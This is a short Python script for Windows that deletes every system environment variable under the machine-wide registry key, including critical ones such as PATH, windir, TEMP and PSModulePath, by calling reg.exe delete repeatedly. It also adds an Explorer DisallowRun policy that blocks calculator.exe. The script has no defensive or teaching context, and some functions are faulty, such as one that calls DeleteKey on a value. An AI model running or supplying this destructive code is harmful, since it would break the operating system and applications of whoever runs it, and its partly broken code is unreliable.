#!/usr/bin/python
#coding:utf-8
import os, sys, time, winreg

# READ A REG IN THE REGISTER
def read_reg():
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Control\Session Manager\Environment',0, winreg.KEY_READ)
    winreg.CloseKey(key)

# FUNCTION TO DELETE A REG ENVIRONMENT IN THE REGISTER
def delRules():
    aKey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment",0, winreg.KEY_ALL_ACCESS)
    for keys in range(0, 1024):
        try:
            keyname = winreg.EnumValue(aKey, keys)
            key, value, id = (keyname)
            cmd = '/windows/system32/reg.exe delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v %s /f' %(key)
            os.system(cmd)
            time.sleep(3)
        except OSError:
            pass

# WRITE A REG IN THE REGISTER
def setRef():
    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 'Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun')
    winreg.SetValueEx(key, '1',0, winreg.REG_SZ, 'calculator.exe' )
    winreg.CloseKey(key)

# FUNCTION TO DELETE A WINDIR REG IN THE ENVIRONMENT PATH
def delWindir():
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment',0, winreg.KEY_SET_VALUE)
    winreg.DeleteKey(key, 'windir')
    winreg.CloseKey(key)

# FUNCTION TO DELETE A SPECIAL REG ENVIRONMENT IN THE REGISTER
def delSpecRules():
    regs = ['TEMP', 'USERNAME', 'windir', 'OS', 'PATHEXT', 'PATH', 'PSModulePath']
    for reg in regs:
        cmd = '/windows/system32/reg.exe delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v %s /f' %(reg)
        os.system(cmd)
        time.sleep(2)
